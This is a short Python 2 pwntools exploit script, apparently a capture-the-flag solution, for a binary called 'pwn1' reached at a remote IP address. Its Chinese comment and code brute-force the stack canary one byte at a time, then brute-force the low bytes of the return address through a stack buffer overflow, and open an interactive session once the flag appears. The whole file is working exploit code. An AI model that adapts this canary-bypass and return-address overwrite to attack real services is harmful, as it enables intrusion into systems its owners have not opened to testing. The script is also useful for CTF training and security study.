#!/bin/python2
# 一字节一字节的爆破canary，返回地址后三位相同，所以爆破一下后四位就行
from pwn import *

context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-x', 'bash', '-c']
context(arch='amd64', os='linux')
local = 0
elf = ELF('./pwn1')
if local:
    p = process('./pwn1')
# libc = elf.libc
else:
    p = remote('123.56.99.60', 31516)

libc = ELF('./pwn1')
p.recvuntil('welcome\n')
canary = '\x00'
for k in range(7):
    for i in range(256):
        print("the " + str(k) + ": " + chr(i))
        p.send('a' * (0x70 - 8) + canary + chr(i))
        a = p.recvuntil("welcome\n")
        print(a)
        if "have fun" in a:
            canary += chr(i)
            print("canary: " + canary)
            break
for i in range(16):
    a = 0x10 * i + 0x2
    pay = 'a' * 0x68 + canary + "a" * 8 + "\x31" + chr(a)
    print(pay)
    # debug()
    p.send(pay)
    out = p.recvuntil("welcome\n")
    print(out)
    if b"{" in out:
        success(out)
        print(out)
        break
p.interactive()
